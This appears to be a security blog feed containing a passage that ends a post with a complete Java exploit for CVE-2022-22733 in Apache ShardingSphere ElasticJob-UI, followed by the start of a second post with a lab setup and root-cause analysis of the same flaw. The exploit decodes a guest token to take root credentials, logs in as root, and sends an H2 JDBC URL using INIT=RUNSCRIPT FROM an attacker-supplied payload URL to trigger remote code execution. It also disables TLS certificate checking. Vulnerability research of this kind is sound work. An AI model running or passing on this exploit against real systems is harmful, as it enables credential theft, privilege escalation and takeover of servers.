String requestBody = &quot;{\&quot;name\&quot;:\&quot;azima\&quot;,\&quot;driver\&quot;:\&quot;org.h2.Driver\&quot;,\&quot;url\&quot;:\&quot;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '&quot;+JDBC+&quot;'\&quot;,\&quot;username\&quot;:\&quot;a\&quot;,\&quot;password\&quot;:\&quot;a\&quot;}&quot;;

URL obj2 = new URL(url2);
HttpURLConnection con2 = (HttpURLConnection) obj2.openConnection();


con2.setRequestMethod(&quot;POST&quot;);
con2.setRequestProperty(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;);
con2.setRequestProperty(&quot;Accept&quot;, &quot;application/json, text/plain, */*&quot;);
con2.setRequestProperty(&quot;Accept-Language&quot;, &quot;en-US,en;q=0.5&quot;);
con2.setRequestProperty(&quot;Accept-Encoding&quot;, &quot;gzip, deflate&quot;);
con2.setRequestProperty(&quot;Content-Type&quot;, &quot;application/json;charset=utf-8&quot;);
con2.setRequestProperty(&quot;Access-Token&quot;, accessToken3);
con2.setRequestProperty(&quot;Origin&quot;, &quot;http://&quot; + host + &quot;:&quot; + port);
con2.setRequestProperty(&quot;DNT&quot;, &quot;1&quot;);
con2.setRequestProperty(&quot;Connection&quot;, &quot;close&quot;);
con2.setRequestProperty(&quot;Referer&quot;, &quot;http://&quot; + host + &quot;:&quot; + port + &quot;/&quot;);
con2.setDoOutput(true);


DataOutputStream wr = new DataOutputStream(con2.getOutputStream());
wr.writeBytes(requestBody);
wr.flush();
wr.close();

int responseCode2 = con2.getResponseCode();
System.out.println(&quot;[*] JDBC Attack Response Code : &quot; + responseCode2);
BufferedReader in2 = new BufferedReader(new InputStreamReader(con2.getInputStream()));
String inputLine2 = &quot;&quot;;
StringBuffer response2 = new StringBuffer();

while ((inputLine2 = in2.readLine()) != null) {
    response2.append(inputLine2);
}
in2.close();


JSONObject jsonObject2 = new JSONObject(response2.toString());
System.out.println(&quot;[*] JDBC Attack Response: &quot; + jsonObject2);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here is the code for our final step and it’s not a big different as we already familiar with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; connection and with sending &amp;amp; parsing response data. Now, Before we test the full code let’s add some &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;try&lt;/code&gt; &amp;amp; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;catch&lt;/code&gt; to handle exceptions &amp;amp; also skip the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSL&lt;/code&gt; verifications.&lt;/p&gt;

&lt;p&gt;Full Code:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import org.json.JSONObject;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Scanner;

public class Main {
    public static void main(String[] args) {
        System.out.print(&quot;[*] CVE-2022-22733 Exploit By: Zeyad Azima\nWebsite: https://zeyadazima.com\nGithub: https://github.com/Zeyad-Azima\n&quot;);
        System.out.println(&quot;&quot;);
        System.out.println(&quot;&quot;);
        try {
            Scanner scanner = new Scanner(System.in);
            System.out.print(&quot;[+] Enter host: &quot;);
            String host = scanner.nextLine();
            System.out.print(&quot;[+] Enter port: &quot;);
            String port = scanner.nextLine();
            System.out.print(&quot;[+] Enter username: &quot;);
            String username = scanner.nextLine();
            System.out.print(&quot;[+] Enter password: &quot;);
            String password = scanner.nextLine();
            System.out.print(&quot;[+] Enter payload URL for JDBC Attack: &quot;);
            String JDBC = scanner.nextLine();
            scanner.close();


            String url = &quot;http://&quot; + host + &quot;:&quot; + port + &quot;/api/login&quot;;
            URL obj = new URL(url);


            TrustManager[] trustAllCerts = new TrustManager[] { new X509TrustManager() {
                public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                    return null;
                }
                public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {
                }
                public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {
                }
            } };
            SSLContext sc = SSLContext.getInstance(&quot;SSL&quot;);
            sc.init(null, trustAllCerts, new java.security.SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -&amp;gt; true);


            HttpURLConnection testCon = (HttpURLConnection) obj.openConnection();
            testCon.setRequestMethod(&quot;HEAD&quot;);
            int responseCodeTest = testCon.getResponseCode();
            if (responseCodeTest != HttpURLConnection.HTTP_OK) {
                System.out.println(&quot;[-] Connection error: &quot; + responseCodeTest);
                return;
            }


            HttpURLConnection con = (HttpURLConnection) obj.openConnection();
            con.setRequestMethod(&quot;POST&quot;);
            con.setRequestProperty(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;);
            con.setRequestProperty(&quot;Accept&quot;, &quot;application/json, text/plain, */*&quot;);
            con.setRequestProperty(&quot;Accept-Language&quot;, &quot;en-US,en;q=0.5&quot;);
            con.setRequestProperty(&quot;Accept-Encoding&quot;, &quot;gzip, deflate&quot;);
            con.setRequestProperty(&quot;Content-Type&quot;, &quot;application/json;charset=utf-8&quot;);
            con.setRequestProperty(&quot;Access-Token&quot;, &quot;&quot;);
            con.setRequestProperty(&quot;Origin&quot;, &quot;http://&quot; + host + &quot;:&quot; + port);
            con.setRequestProperty(&quot;DNT&quot;, &quot;1&quot;);
            con.setRequestProperty(&quot;Connection&quot;, &quot;close&quot;);
            con.setRequestProperty(&quot;Referer&quot;, &quot;http://&quot; + host + &quot;:&quot; + port + &quot;/&quot;);
            String body = &quot;{\&quot;username\&quot;:\&quot;&quot; + username + &quot;\&quot;,\&quot;password\&quot;:\&quot;&quot; + password + &quot;\&quot;}&quot;;
            con.setDoOutput(true);
            con.getOutputStream().write(body.getBytes(&quot;UTF-8&quot;));
            int responseCode = con.getResponseCode();
            System.out.println(&quot;[*] LOGIN Response Code: &quot; + responseCode);
            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
            String inputLine;
            StringBuffer response = new StringBuffer();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            JSONObject jsonObject = new JSONObject(response.toString());
            JSONObject model = jsonObject.getJSONObject(&quot;model&quot;);
            String accessToken = model.getString(&quot;accessToken&quot;);
            //String decodedToken = new String(Base64.getDecoder().decode(accessToken));
            byte[] decodedBytes = Base64.getDecoder().decode(accessToken.getBytes(StandardCharsets.UTF_8));
            String decodedAccessToken = new String(decodedBytes, StandardCharsets.UTF_8);


            JSONObject decodedJsonObject = new JSONObject(decodedAccessToken);

            String rootUsername = &quot;&quot;;
            String rootPassword = &quot;&quot;;
            if (decodedJsonObject.has(&quot;rootUsername&quot;) &amp;amp;&amp;amp; decodedJsonObject.has(&quot;rootPassword&quot;)) {
                rootUsername = decodedJsonObject.getString(&quot;rootUsername&quot;);
                rootPassword = decodedJsonObject.getString(&quot;rootPassword&quot;);
                System.out.println(&quot;[*] Root username: &quot; + rootUsername);
                System.out.println(&quot;[*] Root password: &quot; + rootPassword);
            } else {
                System.out.println(&quot;Access token does not contain rootUsername and rootPassword keys.&quot;);
            }

            // second login request with root credentials
            HttpURLConnection con3 = (HttpURLConnection) obj.openConnection();
            con3.setRequestMethod(&quot;POST&quot;);
            con3.setRequestProperty(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;);
            con3.setRequestProperty(&quot;Accept&quot;, &quot;application/json, text/plain, */*&quot;);
            con3.setRequestProperty(&quot;Accept-Language&quot;, &quot;en-US,en;q=0.5&quot;);
            con3.setRequestProperty(&quot;Accept-Encoding&quot;, &quot;gzip, deflate&quot;);
            con3.setRequestProperty(&quot;Content-Type&quot;, &quot;application/json;charset=utf-8&quot;);
            con3.setRequestProperty(&quot;Access-Token&quot;, &quot;&quot;);
            con3.setRequestProperty(&quot;Origin&quot;, &quot;http://&quot; + host + &quot;:&quot; + port);
            con3.setRequestProperty(&quot;DNT&quot;, &quot;1&quot;);
            con3.setRequestProperty(&quot;Connection&quot;, &quot;close&quot;);
            con3.setRequestProperty(&quot;Referer&quot;, &quot;http://&quot; + host + &quot;:&quot; + port + &quot;/&quot;);
            String requestBody3 = &quot;{\&quot;username\&quot;:\&quot;&quot; + rootUsername + &quot;\&quot;,\&quot;password\&quot;:\&quot;&quot; + rootPassword + &quot;\&quot;}&quot;;
            con3.setDoOutput(true);
            con3.getOutputStream().write(requestBody3.getBytes(&quot;UTF-8&quot;));
            int responseCode3 = con3.getResponseCode();
            System.out.println(&quot;[*] Root Login Response Code: &quot; + responseCode3);
            BufferedReader in3 = new BufferedReader(new InputStreamReader(con3.getInputStream()));
            String inputLine3;
            StringBuffer response3 = new StringBuffer();
            while ((inputLine3 = in3.readLine()) != null) {
                response3.append(inputLine3);
            }
            in3.close();
            JSONObject jsonObject3 = new JSONObject(response3.toString());
            JSONObject model3 = jsonObject3.getJSONObject(&quot;model&quot;);
            String accessToken3 = model3.getString(&quot;accessToken&quot;);
            System.out.println(&quot;[*] Root Access Token: &quot; + accessToken3);

            // JDBC Attack
            String url2 = &quot;http://&quot; + host + &quot;:&quot; + port + &quot;/api/data-source/connectTest&quot;;
            String requestBody = &quot;{\&quot;name\&quot;:\&quot;azima\&quot;,\&quot;driver\&quot;:\&quot;org.h2.Driver\&quot;,\&quot;url\&quot;:\&quot;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '&quot;+JDBC+&quot;'\&quot;,\&quot;username\&quot;:\&quot;a\&quot;,\&quot;password\&quot;:\&quot;a\&quot;}&quot;;

            URL obj2 = new URL(url2);
            HttpURLConnection con2 = (HttpURLConnection) obj2.openConnection();


            con2.setRequestMethod(&quot;POST&quot;);
            con2.setRequestProperty(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;);
            con2.setRequestProperty(&quot;Accept&quot;, &quot;application/json, text/plain, */*&quot;);
            con2.setRequestProperty(&quot;Accept-Language&quot;, &quot;en-US,en;q=0.5&quot;);
            con2.setRequestProperty(&quot;Accept-Encoding&quot;, &quot;gzip, deflate&quot;);
            con2.setRequestProperty(&quot;Content-Type&quot;, &quot;application/json;charset=utf-8&quot;);
            con2.setRequestProperty(&quot;Access-Token&quot;, accessToken3);
            con2.setRequestProperty(&quot;Origin&quot;, &quot;http://&quot; + host + &quot;:&quot; + port);
            con2.setRequestProperty(&quot;DNT&quot;, &quot;1&quot;);
            con2.setRequestProperty(&quot;Connection&quot;, &quot;close&quot;);
            con2.setRequestProperty(&quot;Referer&quot;, &quot;http://&quot; + host + &quot;:&quot; + port + &quot;/&quot;);
            con2.setDoOutput(true);


            DataOutputStream wr = new DataOutputStream(con2.getOutputStream());
            wr.writeBytes(requestBody);
            wr.flush();
            wr.close();

            int responseCode2 = con2.getResponseCode();
            System.out.println(&quot;[*] JDBC Attack Response Code : &quot; + responseCode2);
            BufferedReader in2 = new BufferedReader(new InputStreamReader(con2.getInputStream()));
            String inputLine2 = &quot;&quot;;
            StringBuffer response2 = new StringBuffer();

            while ((inputLine2 = in2.readLine()) != null) {
                response2.append(inputLine2);
            }
            in2.close();


            JSONObject jsonObject2 = new JSONObject(response2.toString());
            System.out.println(&quot;[*] JDBC Attack Response: &quot; + jsonObject2);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And here is our full code after the edits, let’s try it out:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/728ff6f5288f4df9f54de3dd662c5fe4&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Now, We have a full chain of the steps and created our exploit. We can now use it in our next coming engement when we find &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apache ShardingSphere ElasticJob-UI&lt;/code&gt; running. You can find the full code on my github from &lt;a href=&quot;https://github.com/Zeyad-Azima/CVE-2022-22733&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;resources&quot;&gt;&lt;strong&gt;Resources&lt;/strong&gt;&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://github.com/Zeyad-Azima/CVE-2022-22733&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;</content><author><name>Zeyad Azima</name></author><summary type="html">Introduction</summary></entry><entry><title type="html">CVE-2022-22733: Apache ShardingSphere ElasticJob-UI privilege escalation</title><link href="http://localhost:5000/security%20research/CVE_2022_22733/" rel="alternate" type="text/html" title="CVE-2022-22733: Apache ShardingSphere ElasticJob-UI privilege escalation" /><published>2023-04-28T00:00:00+08:00</published><updated>2023-04-28T00:00:00+08:00</updated><id>http://localhost:5000/security%20research/CVE_2022_22733</id><content type="html" xml:base="http://localhost:5000/security%20research/CVE_2022_22733/">&lt;h1 id=&quot;introduction&quot;&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;A vulnerability discovered in Apache ShardingSphere ElasticJob-UI known as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2022-22733&lt;/code&gt;, The vulnerability lead to exposure of sensitive informatiopns and as a results it allows an attacker who has guest account to do privilege escalation.&lt;/p&gt;

&lt;h1 id=&quot;testing-lab&quot;&gt;&lt;strong&gt;Testing Lab&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;For the testing lab the vulnerability affecting version 3.0.0 and prior versions. So, we can use docker to build our testing lab, First pull the docker image:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo docker pull apache/shardingsphere-elasticjob-lite-ui:3.0.0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, Let’s run the app:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo docker run -d --name elasticjob-ui -p 8088:8088 -e ELASTIC_JOB_GUEST_ENABLED=true apache/shardingsphere-elasticjob-lite-ui:3.0.0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here it will run the app and enable the guest access, Therefore we can simulate and reproduce the vulnerability.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/302203b4011d5f8a700420f297226cf2&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;h1 id=&quot;what-is-shardingsphere-elasticjob-ui-&quot;&gt;&lt;strong&gt;What is ShardingSphere ElasticJob-UI ?&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;ShardingSphere ElasticJob-UI is a web-based graphical user interface (GUI) that is part of the ShardingSphere ElasticJob project and provides an easy-to-use interface to manage, monitor, and visualize the status of jobs running in a ShardingSphere ElasticJob cluster. It simplifies the management and administration of distributed scheduling tasks, making it more convenient for users to manage their jobs without dealing directly with the underlying API or configuration files.&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;h1 id=&quot;static-analysis&quot;&gt;&lt;strong&gt;Static Analysis&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Let’s Open burpsuite and take a look at the login request and response.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/a3c77f68ab6940726d7fb61cc9b00ef3&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the above screenshot when we login, It provide us back with a response contains the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;accessToken&lt;/code&gt;. If we copy the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;accessToken&lt;/code&gt; value and decode it:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/4059668d5c71d349e3a6d2980def19bd&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see after decoding the value, It’s exposed the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;guest&lt;/code&gt; username and password which is the user we logged-in with &amp;amp; Also exposed the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; username and password, As a results we can use the exposed &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; creds and escalate our privileges. Let’s see the root cause of this issue by analyzing and going through the login/authentication process code. Now, Under the following class &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;org.apache.shardingsphere.elasticjob.lite.ui.security.AuthenticationFilter&lt;/code&gt; we can see the following:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/77cac8700b632826138caa3c4711a1d5&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Which obvuise is the endpoint where the authentication process happens, Let’s dig deeper into the class code:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/5f77f486a2077b0edabdd341892c158c&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;First, It’s defining the package and import needed libraries by scrolling down we can see the start of defining the class:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9007545f86a4c57cf24fb4ebb2178d35&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AuthenticationFilter&lt;/code&gt; class implements the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Filter&lt;/code&gt; interface and has a constant &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LOGIN_URI&lt;/code&gt; that represents the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;URI&lt;/code&gt; for the login endpoint, a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Gson&lt;/code&gt; object for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JSON&lt;/code&gt; serialization and deserialization, and a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserAuthenticationService&lt;/code&gt; object from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserAuthenticationService&lt;/code&gt; class that can be set using a setter method. If we go to that class under the same location we will be able to see that it’s responsiable to check for the user in the authentication process. In other words, It’s a main part of the authentication. As we mentioned before about the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Filter&lt;/code&gt; interface, It’s basically a part of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Servlet API&lt;/code&gt; and is used to define filters that can intercept requests and responses going to and coming from a web application, For example, modifying request parameters, add or modify request headers, perform logging, and even transform the response returned by the server. Something important we have to know about the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Filter&lt;/code&gt; interface and It’s that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Filter&lt;/code&gt; interface contains three methods:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;init(FilterConfig config)&lt;/code&gt;: This method is called when the filter is initialized and It allows the filter to perform any initialization that is required.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;doFilter(ServletRequest request, ServletResponse response, FilterChain chain)&lt;/code&gt;: This method is called for every incoming request that matches the filter mapping and It allows the filter to examine or modify the request, perform any filtering logic, and then pass the request on to the next filter in the chain or to the servlet.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;destroy()&lt;/code&gt;: This method is called when the filter is destroyed and It allows the filter to perform any cleanup that is required.&lt;br /&gt;
  By completing our lines of codes we can see the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;doFilter()&lt;/code&gt; method:&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9ef9e688b010ae213464c669e6a50487&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The method takes three parameters &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;servletRequest&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;servletResponse&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filterChain&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;servletRequest&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;servletResponse&lt;/code&gt; parameters are instances of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ServletRequest&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ServletResponse&lt;/code&gt; interfaces, respectively. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filterChain&lt;/code&gt; parameter is an object that represents the next filter in the chain or the servlet that the request is being sent to. Then, The method first casts the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ServletRequest&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ServletResponse&lt;/code&gt; objects to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HttpServletRequest&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HttpServletResponse&lt;/code&gt;, respectively. After that it checks if the request &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;URI&lt;/code&gt; matches the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LOGIN_URI&lt;/code&gt; constant. If it does, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handleLogin&lt;/code&gt; method is called to handle the login request and If not the method checks if the request has a valid access token by checking the value of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Access-Token&lt;/code&gt; header. If the access token is valid, the request is passed on to the next filter in the chain using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;doFilter&lt;/code&gt; method of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FilterChain&lt;/code&gt; object. Otherwise, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;respondWithUnauthorized&lt;/code&gt; method is called to return an unauthorized status code to the client.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/000b77ffd459e65870b81fa9d62d5741&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;destroy()&lt;/code&gt; method is empty and is used to clean up any resources used by the filter and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handleLogin&lt;/code&gt; method is responsible for handling user login requests. It receives a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HttpServletRequest&lt;/code&gt; object, which contains the user’s credentials, and a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HttpServletResponse&lt;/code&gt; object, which is used to return the server’s response.It’s first reads the user’s credentials from the request using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getReader&lt;/code&gt; method and converts them to a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserAccount&lt;/code&gt; object using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gson.fromJson&lt;/code&gt; method. Then calls the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;checkUser&lt;/code&gt; method of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;userAuthenticationService&lt;/code&gt; object to check the validity of the user’s credentials. If the credentials are valid the method creates a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HashMap&lt;/code&gt; object to hold the user’s information, including their username, accessToken, and whether they are a guest user. It then writes this information to the response using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;httpResponse.getWriter().write&lt;/code&gt; method after converting it to a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JSON&lt;/code&gt; string using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gson.toJson&lt;/code&gt; method. If the user’s credentials are invalid, the method calls the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;respondWithUnauthorized&lt;/code&gt; method, which writes a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JSON&lt;/code&gt; string to the response indicating that the user is unauthorized.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/4aadfcfe3d871e47a9c1a4106b2bc654&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In this line we can notice it’s where the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;accessToken&lt;/code&gt; returned to the user and it’s being called from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getToken()&lt;/code&gt; method from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;userAuthenticationService&lt;/code&gt; object which is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;userAuthenticationService&lt;/code&gt; class. Now, If we go to the class:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package org.apache.shardingsphere.elasticjob.lite.ui.security;

import com.google.common.base.Strings;
import com.google.gson.Gson;
import lombok.Setter;
import org.apache.commons.codec.binary.Base64;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.stereotype.Component;

/**
 * User authentication service.
 */
@Component
@ConfigurationProperties(prefix = &quot;auth&quot;)
@Setter
public final class UserAuthenticationService {
    
    private String rootUsername;
    
    private String rootPassword;
    
    private String guestUsername;
    
    private String guestPassword;
    
    private final Base64 base64 = new Base64();
    
    private Gson gson = new Gson();
    
    /**
     * Check user.
     *
     * @param userAccount user account
     * @return check success or failure
     */
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see that it starts with defining the package, class and some variables which we can see in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;accessToken&lt;/code&gt; when we decoded it such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rootUsername&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rootPassword&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;guestUsername&lt;/code&gt; &amp;amp; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;guestPassword&lt;/code&gt; and creates a new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Base64&lt;/code&gt; object along with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JSON&lt;/code&gt; object to store data into.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    public AuthenticationResult checkUser(final UserAccount userAccount) {
        if (null == userAccount || Strings.isNullOrEmpty(userAccount.getUsername()) || Strings.isNullOrEmpty(userAccount.getPassword())) {
            return new AuthenticationResult(null, null, false, false);
        }
        if (rootUsername.equals(userAccount.getUsername()) &amp;amp;&amp;amp; rootPassword.equals(userAccount.getPassword())) {
            return new AuthenticationResult(rootUsername, rootPassword, true, false);
        }
        if (guestUsername.equals(userAccount.getUsername()) &amp;amp;&amp;amp; guestPassword.equals(userAccount.getPassword())) {
            return new AuthenticationResult(guestUsername, guestPassword, true, true);
        }
        return new AuthenticationResult(null ,null, false, false);
    }
     /**
     * Get user authentication token.
     *
     * @return authentication token
     */
    public String getToken() {
        return base64.encodeToString(gson.toJson(this).getBytes());
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

